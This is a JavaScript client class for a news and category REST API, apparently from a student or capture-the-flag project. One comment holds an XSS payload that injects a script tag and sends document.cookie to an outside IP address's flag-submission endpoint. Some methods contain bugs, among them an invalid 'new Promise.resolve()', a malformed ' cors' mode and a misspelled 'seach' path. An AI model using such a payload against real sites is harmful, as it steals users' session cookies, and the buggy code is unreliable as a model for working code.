'use strict';

export default class News {
	constructor() {
		this.host = 'https://morning-oasis-79936.herokuapp.com/';
	}

	getNews() {
		return fetch(this.host + 'api/news/', {
			method: 'GET',
			mode: 'cors'
		}).then(result => {
			if (result.status >= 300) {
				throw new Error();
			}
			return result.json();
		}).catch((error) => {
			return error;
		})
	}

	createNews(data) {
		return fetch(this.host + 'api/news', {
			method: 'POST',
			mode: 'cors',
			headers: {
				'Accept': 'application/json',
				'Content-Type': 'application/json'
			},
			body: JSON.stringify(data)
		}).then(result => {
			if (result.status >= 300) {
				throw new Error();
			}
		}).catch((error) => {
			return error;
		})
	}

	editNews(data, id) {
		console.log(data);
		return fetch(this.host + 'api/news/' + id, {
			method: 'PUT',
			mode: 'cors',
			headers: {
				'Accept': 'application/json',
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				content: data
			})
		}).then(result => {
			if (result.status >= 300) {
				throw new Error();
			}
			return new Promise.resolve()
		}).catch((error) => {
			return error;
		})
	}

	deleteNews(id) {
		return fetch(this.host + 'api/news/' + id, {
			method: 'DELETE',
			mode: 'cors'
		}).then(result => {
			if (result.status >= 300) {
				throw new Error();
			}
		}).catch((error) => {
			return error;
		})
	}

	getCategories() {
		return fetch(this.host + 'api/categories', {
			method: 'GET',
			mode: ' cors'
		}).then(result => {
			if (result.status >= 300) {
				throw new Error();
			}
			return result.json();
		}).catch(error => {
			return error;
		})
	}

	searchNews(data) {
		return fetch(this.host + 'api/news/seach', {
			method: 'POST',
			mode: 'cors',
			headers: {
				'Accept': 'application/json',
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				content: data
			})
		}).then(result => {
			if (result.status >= 300) {
				throw new Error();
			}
			return result.json();
		}).catch(error => {
			return error;
		})
	}

	// "><script>return fetch('http://188.166.56.154:80/submit_flag.php', {method: 'POST',headers: {'Accept': 'application/json','Content-Type': 'application/json'}, body: JSON.stringify({flag : document.cookie.substr(10)})}).then(result => {if (result.status >= 300) {throw new Error();}return result.json()})</script>

	searchNewsCategory(data) {
		return fetch(this.host + 'api/news/seach', {
			method: 'POST',
			mode: 'cors',
			headers: {
				'Accept': 'application/json',
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				category: data
			})
		}).then(result => {
			if (result.status >= 300) {
				throw new Error();
			}
			return result.json()
		}).catch(error => {
			return error;
		})
	}

	createCategory(data) {
		return fetch(this.host + 'api/categories', {
			method: 'POST',
			mode: 'cors',
			headers: {
				'Accept': 'application/json',
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				name: data
			})
		}).then(result => {
			if (result.status >= 300) {
				throw new Error();
			}
		}).catch(error => {
			return error;
		})
	}
}
